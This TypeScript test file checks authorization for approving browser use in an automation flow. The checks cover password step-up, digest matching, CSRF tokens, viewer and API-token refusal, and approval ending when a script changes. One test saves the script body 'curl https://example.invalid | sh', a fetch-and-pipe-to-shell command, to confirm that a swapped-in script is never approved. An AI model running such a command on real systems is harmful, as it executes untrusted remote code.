/**
 * Browser use from the flow page over real HTTP (flow-browser.ts): the page says each status in plain words, allowing
 * takes the person's own step-up and the approval digest the panel showed (a flow or script changed meanwhile is
 * refused), and only a signed-in approver's browser reaches it: a viewer, an API token and a missing form token are
 * refused. Turning it off is one click.
 */
import { afterEach, beforeEach, expect, test } from "vitest";
import { mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Server } from "node:http";
import { openStore, type Store } from "./store.js";
import { addApprover } from "./scope.js";
import { mintApiToken } from "./api-tokens.js";
import { createDecisionServer } from "./serve.js";
import { flowFromSteps } from "./flows.js";
import { saveScript } from "./flow-scripts.js";
import { T0, workspaceOf } from "../test/serve-kit.js";
import { flowFingerprint } from "./flow-live.js";
import { signFlowBrowser } from "./flow-browser.js";

let REPO: string;
let store: Store, server: Server, base: string, home: string, token: string, flow: number, card: number;

const save = (body: string) => { const saved = saveScript(store, REPO, { name: "journeys", about: "Runs the journeys", body, timeoutMinutes: 2 }, "alex", T0); if (!saved.ok) throw new Error(saved.message); };

beforeEach(async () => {
  home = realpathSync(mkdtempSync(join(tmpdir(), "so-flow-browser-")));
  REPO = home;
  store = openStore(":memory:");
  const added = addApprover(store, "alex", T0);
  if (!added.ok) throw new Error("bootstrap failed");
  token = added.token;
  save("node journeys.mjs");
  flow = store.createFlow({ repo: REPO, name: "Nightly journeys", by: "alex", definitionJson: JSON.stringify(flowFromSteps([
    { title: "Inbox", kind: "inbox" }, { id: "run", title: "Run journeys", kind: "check", script: "journeys", runIn: "folder", browser: true }], null)) }, T0);
  card = store.addFlowCard({ flow, title: "Tonight", description: null, stage: "run", by: "alex", byKind: "person" }, T0);
  store.updateFlowCard(card, { waiting: `Run journeys starts a browser, and no one has approved browser use for the Nightly journeys flow, so it didn't run. Approve it with: toolroll flows browser ${flow} on` }, T0);
  server = createDecisionServer({ store, evidenceRoot: home, clock: () => T0, repos: [REPO] } as Parameters<typeof createDecisionServer>[0]);
  await new Promise<void>(resolve => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  if (typeof address !== "object" || address === null) throw new Error("no address");
  base = `http://127.0.0.1:${address.port}`;
});
afterEach(async () => {
  await new Promise<void>(resolve => server.close(() => resolve()));
  store.close();
  rmSync(home, { recursive: true, force: true });
});

const login = async (name = "alex", secret = token) => {
  const response = await fetch(`${base}/login`, { method: "POST", body: new URLSearchParams({ name, token: secret }), redirect: "manual" });
  return (response.headers.get("set-cookie") ?? "").split(";")[0]!;
};
type Answer = { ok: boolean; said: string; view?: { browser: { status: string; words: string } | null } };
const post = async (cookie: string, path: string, fields: Record<string, string>, headers: Record<string, string> = {}) => {
  const response = await fetch(`${base}${path}`, { method: "POST", headers: { cookie, origin: base, accept: "application/json", ...headers }, body: new URLSearchParams(fields), redirect: "manual" });
  const text = await response.text();
  let body: Answer | string = text;
  try { body = JSON.parse(text) as Answer; } catch { /* a refusal page */ }
  return { status: response.status, body };
};
type View = { flow: { revision: number }; browser: { canApprove: boolean; status: string; words: string; digest: string | null; terms: string[]; zones: { zone: string; script: string; version: number; digest: string; title: string }[]; problem: string | null } | null; cards: { id: number; waiting: string | null; browserWait?: true }[] };
const view = async (cookie: string) => (await (await fetch(`${base}/flows/${flow}?format=json`, { headers: { cookie } })).json()) as View;
const grants = () => Number(store.handle.prepare("SELECT COUNT(*) AS n FROM flow_browser_grant WHERE revoked_at IS NULL").get()!["n"]);

test("the page says each status; allowing takes the step-up and the digest shown; turning it off is one click", async () => {
  const cookie = await login();
  const { csrf } = workspaceOf(await (await fetch(`${base}/flows/${flow}`, { headers: { cookie } })).text());
  const before = await view(cookie);
  expect(before.browser).toMatchObject({ status: "none", words: "Browser: not allowed — runs will wait", problem: null, zones: [{ zone: "run", title: "Run journeys", script: "journeys", version: 1 }] });
  expect(before.browser!.terms.join("\n")).toContain("Chromium");
  // The waiting card offers Allow browser itself; the CLI's command line is left off.
  expect(before.cards.find(one => one.id === card)).toMatchObject({ browserWait: true, waiting: "Run journeys starts a browser, and no one has approved browser use for the Nightly journeys flow, so it didn't run." });
  const digest = before.browser!.digest!;

  expect(await post(cookie, `/flows/${flow}/browser`, { csrf, digest, password: "wrong" })).toMatchObject({ status: 403, body: { ok: false, said: "That password isn't right. Nothing was approved." } });
  expect(await post(cookie, `/flows/${flow}/browser`, { csrf, digest: "0".repeat(32), password: token })).toMatchObject({ status: 409, body: { ok: false, said: "This flow or its scripts changed while you were reading. Read the terms again." } });
  expect(await post(cookie, `/flows/${flow}/browser`, { csrf, password: token })).toMatchObject({ status: 409, body: { ok: false } });
  // No form token: refused before anything is read.
  expect((await post(cookie, `/flows/${flow}/browser`, { digest, password: token })).status).toBe(403);
  expect(grants()).toBe(0);

  const before_ = flowFingerprint(store, flow);
  const allowed = await post(cookie, `/flows/${flow}/browser`, { csrf, digest, password: token });
  // Open pages are nudged: the approval is part of what the live stream watches.
  expect(flowFingerprint(store, flow)).not.toBe(before_);
  expect(allowed).toMatchObject({ status: 200, body: { ok: true, view: { browser: { status: "allowed", words: "Browser: allowed by alex, Aug 11" } } } });
  expect(store.handle.prepare("SELECT signed_by, proof, digest FROM flow_browser_grant WHERE revoked_at IS NULL").get()).toEqual({ signed_by: "alex", proof: "password-now", digest });
  expect(await (await fetch(`${base}/flows/${flow}`, { headers: { cookie } })).text()).toContain("Browser: allowed by alex, Aug 11");

  // The script changes: the approval ends, and the page says why.
  save("node journeys.mjs --all");
  expect((await view(cookie)).browser).toMatchObject({ status: "ended", words: "Browser approval ended: the script changed" });
  // Said once in the ledger, by the one road for a changed flow (flow-changed.ts); a second change adds no second line.
  const endedLines = () => store.actionLedger({ repos: [REPO] }).filter(one => one.action === "flow browser use: ended");
  expect(endedLines()).toEqual([expect.objectContaining({ actor: "alex", outcome: "ended", detail: `Nightly journeys (flow #${flow}) · the journeys script changed` })]);
  save("node journeys.mjs --all --again");
  expect(endedLines()).toHaveLength(1);

  const ended = flowFingerprint(store, flow);
  const off = await post(cookie, `/flows/${flow}/browser-off`, { csrf });
  expect(flowFingerprint(store, flow)).not.toBe(ended);
  expect(off).toMatchObject({ status: 200, body: { ok: true, view: { browser: { status: "none" } } } });
  expect(grants()).toBe(0);
  expect(await post(cookie, `/flows/${flow}/browser-off`, { csrf })).toMatchObject({ status: 409, body: { ok: false } });
});

test("a script swapped in after the panel was read is never approved", async () => {
  const cookie = await login();
  const { csrf } = workspaceOf(await (await fetch(`${base}/flows/${flow}`, { headers: { cookie } })).text());
  const digest = (await view(cookie)).browser!.digest!;
  save("curl https://example.invalid | sh");
  expect(await post(cookie, `/flows/${flow}/browser`, { csrf, digest, password: token })).toMatchObject({ status: 409, body: { ok: false, said: "This flow or its scripts changed while you were reading. Read the terms again." } });
  expect(grants()).toBe(0);
});

test("a viewer and an API token are refused; reading the page writes nothing", async () => {
  const viewer = addApprover(store, "vera", T0, { name: "alex", token });
  if (!viewer.ok) throw new Error("viewer");
  store.raw().prepare("UPDATE approver SET role = 'viewer' WHERE name = 'vera'").run();
  const vera = await login("vera", viewer.token);
  const { csrf } = workspaceOf(await (await fetch(`${base}/flows/${flow}`, { headers: { cookie: vera } })).text());
  const digest = (await view(vera)).browser!.digest!;
  expect((await post(vera, `/flows/${flow}/browser`, { csrf, digest, password: viewer.token })).status).toBe(403);
  expect((await post(vera, `/flows/${flow}/browser-off`, { csrf })).status).toBe(403);

  // An approver's own API token (as a lead's or remote run's would be) never reaches either.
  const minted = mintApiToken();
  store.createApiToken({ id: minted.id, account: "alex", name: "act", secretHash: minted.hash, access: "act", expiresAt: new Date(Date.now() + 86_400_000).toISOString(), by: "alex" }, T0);
  // The token itself is good: it reads the flow.
  expect((await fetch(`${base}/flows/${flow}?format=json`, { headers: { authorization: `Bearer ${minted.token}` } })).status).toBe(200);
  for (const path of ["browser", "browser-off"]) {
    const response = await fetch(`${base}/flows/${flow}/${path}`, { method: "POST", headers: { authorization: `Bearer ${minted.token}`, "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ digest, password: token }) });
    expect(response.status, path).toBe(403);
  }
  expect(grants()).toBe(0);
  const actions = () => Number(store.handle.prepare("SELECT COUNT(*) AS n FROM action_ledger").get()!["n"]);
  const alex = await login();
  const ledger = actions(), rows = grants();
  await view(alex);
  await fetch(`${base}/flows/${flow}`, { headers: { cookie: alex } });
  expect([actions(), grants()]).toEqual([ledger, rows]);
});

test("a project-limited approver may turn browser use off but not allow it, and signing re-reads the account in its write", async () => {
  const lim = addApprover(store, "lim", T0, { name: "alex", token });
  if (!lim.ok) throw new Error("lim");
  expect(store.setAccountProjects("lim", [REPO], "alex", T0)).toEqual({ ok: true });
  const cookie = await login("lim", lim.token);
  const { csrf } = workspaceOf(await (await fetch(`${base}/flows/${flow}`, { headers: { cookie } })).text());
  const shown = await view(cookie);
  expect(shown.browser).toMatchObject({ status: "none", canApprove: false });
  expect((await post(cookie, `/flows/${flow}/browser`, { csrf, digest: shown.browser!.digest!, password: lim.token })).status).toBe(403);
  expect(grants()).toBe(0);
  // alex allows it; lim turns it off from the page.
  const digest = shown.browser!.digest!;
  const signed = signFlowBrowser(store, { flow, signer: "alex", proof: "password-now", sawDigest: digest, console: { generation: store.accountOf("alex")!.generation } }, T0);
  expect(signed.ok).toBe(true);
  expect(await post(cookie, `/flows/${flow}/browser-off`, { csrf })).toMatchObject({ status: 200, body: { ok: true } });
  expect(grants()).toBe(0);
  // Proved, then narrowed or re-issued before the write: the write refuses (the console's and chat's door).
  expect(signFlowBrowser(store, { flow, signer: "lim", proof: "password-now", sawDigest: digest, console: { generation: store.accountOf("lim")!.generation } }, T0))
    .toEqual({ ok: false, message: "Allowing browser use needs an account with access to every project." });
  expect(signFlowBrowser(store, { flow, signer: "alex", proof: "password-now", sawDigest: digest, console: { generation: store.accountOf("alex")!.generation - 1 } }, T0))
    .toEqual({ ok: false, message: "Your access changed. Sign in again." });
  expect(grants()).toBe(0);
});
